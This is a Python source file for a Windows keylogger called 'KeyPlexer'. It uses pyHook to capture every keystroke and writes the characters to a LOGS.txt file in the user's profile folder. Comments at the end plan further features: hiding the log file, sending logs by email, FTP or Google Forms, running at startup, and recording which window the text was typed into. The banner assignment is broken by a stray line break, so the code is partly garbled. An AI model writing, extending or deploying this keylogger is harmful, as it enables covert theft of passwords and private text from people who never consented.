import pyHook, pythoncom, sys, logging , os


def intro():

   key_ascii=
    	"""
	 _  __             ____   _                        
        | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
        | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
        | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
        |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
             		|___/                                  


		 ooo,    .---.
		 o`  o   /    |\________________
		o`   'oooo()  | ________   _   _)
		`oo   o` \    |/        | | | |
		  `ooo'   `---'         "-" |_|
		"""
    print key_ascii
    
intro()

file_logs = os.path.join(os.path.expandvars("%userprofile%"),"LOGS.txt")


def capture_key_strokes(event):
    """
    This function captures key strokes from the Operating system and store it locally
    """
    logging.basicConfig(filename=file_logs, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = capture_key_strokes # captures keydown stores
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()




# TO:DO

# Store the logs locally 
# Hide the file
# Parse the loggs into readable lines
# SEND LOGS TO EMAIL


# Additional Features
# Task Scheduler (windows) to run on startup.
# datetime module to make a new log file each day.
#Removed sys and logging imports and instead used standard file code
#Stores each line rather than one character per line. (separates lines when enter/tab is pressed)
#Removes characters when backspace is pressed so final output is coherent.
#Displays (in the log), the window the text was typed into eg 'youtube', 'google', 'microsoft word'.
# SEND LOGS TO FTP
# SEND LOGS TO GOOGLE FORMS
# Rewrite the function into Classes
